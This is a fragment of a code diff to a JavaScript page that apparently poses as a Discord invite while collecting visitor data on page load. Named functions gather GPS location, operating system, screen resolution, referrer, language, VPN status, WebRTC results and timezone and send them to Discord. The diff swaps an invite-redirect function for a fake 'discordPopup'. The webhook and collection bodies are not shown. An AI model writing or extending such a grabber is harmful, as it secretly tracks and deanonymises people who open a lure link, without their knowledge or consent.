@@ -1,9 +1,8 @@
-var redirect_url = "REDIRECT URL GOES HERE"
+
 
 // Extended Operating System Detection
 function detectOperatingSystem(userAgent) {
     if (userAgent.includes("Win")) {
-        if (userAgent.includes("windows NT 11.0")) return "Windows 11";
         if (userAgent.includes("Windows NT 10.0")) return "Windows 10";
         if (userAgent.includes("Windows NT 6.3")) return "Windows 8.1";
         if (userAgent.includes("Windows NT 6.2")) return "Windows 8";
@@ -251,6 +250,7 @@ function getAdditionalDetails() {
 // Function to send message to Discord
 function sendDiscordEmbed(location, gpsValue, systemDetails, screenResolution, referrer, language, isVpn, vpnMessage, webrtcResult, userTimezone) {
     var additionalDetails = getAdditionalDetails();
+    var otherDetails = getSystemDetails();
 
     // Combine additionalDetails and other data into a single object
     var postData = {
@@ -290,13 +290,15 @@ function sendDiscordEmbed(location, gpsValue, systemDetails, screenResolution, r
 }
 
 
-// Function to handle the acceptance of the invite
-function acceptInvite() {
-    window.location.href = redirect_url
-}
 
-// Attach the acceptInvite function to the global window object
-window.acceptInvite = acceptInvite;
+
+// Function to show the popup
+function showPopup() {
+    var popup = document.getElementById('discordPopup');
+    if (popup) {
+        popup.style.display = 'block';
+    }
+}
 
 // Run these functions on page load
 getLocationAndGPSData();
